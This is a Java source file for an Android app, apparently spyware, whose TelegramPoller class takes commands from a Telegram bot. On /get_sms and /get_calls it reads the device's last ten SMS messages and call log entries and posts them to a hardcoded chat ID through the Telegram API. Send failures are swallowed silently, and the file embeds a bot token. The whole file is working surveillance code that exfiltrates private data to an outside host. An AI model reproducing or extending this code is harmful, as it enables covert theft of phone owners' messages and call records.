package com.silent.telebot;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.os.Build;
import android.provider.CallLog;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramPoller implements Runnable {
    private Context ctx;
    private static final String BOT_TOKEN = "8664055093:AAFzjAY549sKvHPh7pdwepTgr7AUtzSW4c8";  // غيّر هذا
    private static final String CHAT_ID = "8204844881";      // ❗ غيّر هذا إلى معرف الدردشة الثابت
    private static int lastUpdateId = 0;

    public TelegramPoller(Context ctx) { this.ctx = ctx; }

    @Override
    public void run() {
        try {
            String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1) + "&timeout=5";
            HttpURLConnection conn = (HttpURLConnection) new URL(urlStr).openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(5000);
            conn.setReadTimeout(5000);

            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            conn.disconnect();

            JSONObject jsonResponse = new JSONObject(response.toString());
            if (jsonResponse.getBoolean("ok")) {
                JSONArray updates = jsonResponse.getJSONArray("result");
                for (int i = 0; i < updates.length(); i++) {
                    JSONObject update = updates.getJSONObject(i);
                    lastUpdateId = update.getInt("update_id");
                    if (update.has("message")) {
                        JSONObject message = update.getJSONObject("message");
                        String text = message.optString("text", "");
                        // long chatId = message.getJSONObject("chat").getLong("id"); // لم نعد نستخدمه
                        String result = handleCommand(text);
                        sendMessage(CHAT_ID, result);  // ← نرسل إلى الدردشة الثابتة
                    }
                }
            }
        } catch (Exception e) {
            Log.e("TelegramPoller", "Error: " + e.getMessage());
        }
    }

    private String handleCommand(String cmd) {
        if (cmd.equals("/get_sms")) return getSmsInbox();
        if (cmd.equals("/get_calls")) return getCallLog();
        if (cmd.equals("/help")) return "أوامر:\n/get_sms\n/get_calls";
        return "أمر غير معروف";
    }

    private String getSmsInbox() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            ContentResolver cr = ctx.getContentResolver();
            Cursor cursor = null;
            try {
                cursor = cr.query(Telephony.Sms.Inbox.CONTENT_URI,
                        new String[]{"address", "body", "date"},
                        null, null, "date DESC LIMIT 10");
                if (cursor != null && cursor.moveToFirst()) {
                    StringBuilder sb = new StringBuilder("📩 آخر 10 رسائل:\n");
                    do {
                        sb.append(cursor.getString(0)).append(": ").append(cursor.getString(1)).append("\n");
                    } while (cursor.moveToNext());
                    return sb.toString();
                }
            } catch (SecurityException e) { return "❌ صلاحية الرسائل غير ممنوحة"; }
            finally { if (cursor != null) cursor.close(); }
        }
        return "لا توجد رسائل";
    }

    private String getCallLog() {
        ContentResolver cr = ctx.getContentResolver();
        Cursor cursor = null;
        try {
            cursor = cr.query(CallLog.Calls.CONTENT_URI,
                    new String[]{CallLog.Calls.NUMBER, CallLog.Calls.DATE, CallLog.Calls.DURATION, CallLog.Calls.TYPE},
                    null, null, CallLog.Calls.DATE + " DESC LIMIT 10");
            if (cursor != null && cursor.moveToFirst()) {
                StringBuilder sb = new StringBuilder("📞 آخر 10 مكالمات:\n");
                do {
                    String type = cursor.getInt(3) == CallLog.Calls.INCOMING_TYPE ? "📥 وارد" : "📤 صادر";
                    sb.append(cursor.getString(0)).append(" (").append(type).append(") ").append(cursor.getString(2)).append("s\n");
                } while (cursor.moveToNext());
                return sb.toString();
            }
        } catch (SecurityException e) { return "❌ صلاحية سجل المكالمات غير ممنوحة"; }
        finally { if (cursor != null) cursor.close(); }
        return "لا توجد مكالمات";
    }

    private void sendMessage(String chatId, String text) {
        try {
            URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");

            JSONObject payload = new JSONObject();
            payload.put("chat_id", chatId);      // نستخدم الثابت
            payload.put("text", text);

            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes());
            os.flush();
            os.close();
            conn.getResponseCode();
            conn.disconnect();
        } catch (Exception e) { /* صامت */ }
    }
                                                                 } 
